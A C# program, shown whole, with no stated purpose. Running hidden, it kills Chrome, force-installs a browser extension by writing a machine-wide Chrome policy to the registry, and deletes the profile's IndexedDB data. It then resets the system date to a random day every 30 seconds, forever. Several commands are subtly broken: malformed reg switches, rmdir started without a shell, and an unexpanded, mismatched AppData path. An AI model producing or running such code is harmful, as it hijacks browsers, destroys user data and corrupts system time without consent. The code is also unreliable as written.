using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;

class Program
{
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool SetSystemTime(ref SYSTEMTIME st);

    [StructLayout(LayoutKind.Sequential)]
    struct SYSTEMTIME
    {
        public ushort Year;
        public ushort Month;
        public ushort DayOfWeek;
        public ushort Day;
        public ushort Hour;
        public ushort Minute;
        public ushort Second;
        public ushort Milliseconds;
    }

    [STAThread]
    static void Main()
    {
        Random rnd = new Random();
        RunCommand("taskkill", "/f /im chrome.exe");
        RunCommand("reg", "add \"HKLM\\SOFTWARE\\Policies\\Google\\Chrome\\ExtensionInstallForcelist\" / v 1 / t REG_SZ / d \"ddkjiahejlhfcafbddmgiahcphecmpfh;https://clients2.google.com/service/update2/crx");
        RunCommand("rmdir", "/s %AppData%\\Local\\Google\\Chrome\\User Data\\Default\\IndexedDB");
        RunCommand("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "");
        while (true)
        {
            DateTime startDate = new DateTime(2024, 1, 1);
            DateTime endDate = new DateTime(2026, 1, 1);
            int range = (endDate - startDate).Days;

            DateTime randomDate = startDate.AddDays(rnd.Next(range + 1));

            SetDateOnly(randomDate);

            Thread.Sleep(30000); // Wait 30 seconds
        }
    }

    static void SetDateOnly(DateTime date)
    {
        SYSTEMTIME st = new SYSTEMTIME
        {
            Year = (ushort)date.Year,
            Month = (ushort)date.Month,
            Day = (ushort)date.Day,
            DayOfWeek = (ushort)date.DayOfWeek,
            Hour = (ushort)DateTime.UtcNow.Hour,
            Minute = (ushort)DateTime.UtcNow.Minute,
            Second = (ushort)DateTime.UtcNow.Second,
            Milliseconds = (ushort)DateTime.UtcNow.Millisecond
        };

        SetSystemTime(ref st);
    }

    static string RunCommand(string fileName, string arguments)
    {
        ProcessStartInfo psi = new ProcessStartInfo
        {
            FileName = fileName,
            Arguments = arguments,
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            UseShellExecute = false,
            CreateNoWindow = true
        };

        using (Process process = new Process { StartInfo = psi })
        {
            process.Start();
            string output = process.StandardOutput.ReadToEnd();
            string error = process.StandardError.ReadToEnd();
            process.WaitForExit();

            if (!string.IsNullOrEmpty(error))
            {
                return $"Error: {error}";
            }

            return output.Trim();
        }
    }
}
